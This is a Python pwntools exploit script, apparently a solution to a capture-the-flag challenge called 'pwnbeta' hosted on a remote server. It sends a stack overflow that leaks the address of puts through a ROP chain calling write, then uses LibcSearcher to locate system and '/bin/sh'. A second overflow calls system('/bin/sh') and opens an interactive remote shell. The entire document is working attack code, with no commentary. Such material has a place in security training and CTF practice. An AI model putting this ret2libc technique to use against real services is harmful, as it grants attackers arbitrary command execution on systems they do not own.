from pwn import*
from LibcSearcher import LibcSearcher
p = remote('vps1.blue-whale.me',19901)
elf = ELF('./pwnbeta')
context.log_level='debug'
#gdb.attach(p)

pop_rdi = 0x4008a3
pop_rsi_r15 = 0x4008a1
pop_rdx = 0x4006ec

write_plt = elf.plt['write']
puts_got = elf.got['puts']
return_addr = 0x40074c

p.recvuntil("What say you now?")
payload = "Everything intelligent is so boring."
p.send(payload)

padding = 'a'*0x400 + 'b'*0x8

payload = padding
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(puts_got) + p64(1)
payload += p64(pop_rdx) + p64(8)
payload += p64(write_plt)
payload += p64(return_addr)
p.recvuntil("What an interesting thing to say.\nTell me more.")
p.send(payload)
p.recvuntil("Fascinating.\n")
puts_addr = u64(p.recv(8))

libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

p.recvuntil("What say you now?")
payload = "Everything intelligent is so boring."
p.send(payload)

payload = padding
payload += p64(pop_rdi)+p64(binsh_addr)
payload += p64(system_addr)
p.recvuntil("What an interesting thing to say.\nTell me more.")
p.send(payload)

p.recvuntil("Fascinating.\n")
p.interactive()
